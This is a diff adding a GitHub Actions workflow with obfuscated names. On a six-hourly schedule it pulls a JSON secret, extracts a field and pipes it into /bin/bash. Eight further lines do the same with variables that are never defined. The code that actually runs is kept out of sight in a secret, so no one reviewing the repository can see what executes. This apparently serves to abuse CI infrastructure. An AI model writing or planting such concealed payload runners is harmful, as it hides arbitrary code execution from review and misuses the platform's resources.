@@ -1,0 +1,25 @@
+name: suoweicangjiie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: suoweicangjiie
+        env:
+          uyf3: ${{ secrets.uyf3 }}
+        run: |
+          echo $uyf3 | jq -r .hpbuu34045 | /bin/bash
+          echo $zupm54 | jq -r .dozy639 | /bin/bash
+          echo $cv10861 | jq -r .qdzpd1287 | /bin/bash
+          echo $ad39156 | jq -r .aijmx7502 | /bin/bash
+          echo $hprt265 | jq -r .pciej117 | /bin/bash
+          echo $utvko4740 | jq -r .fw42131 | /bin/bash
+          echo $wt32 | jq -r .kv50154 | /bin/bash
+          echo $p03 | jq -r .xnfsa6 | /bin/bash
+          echo $d557 | jq -r .alm181 | /bin/bash
+
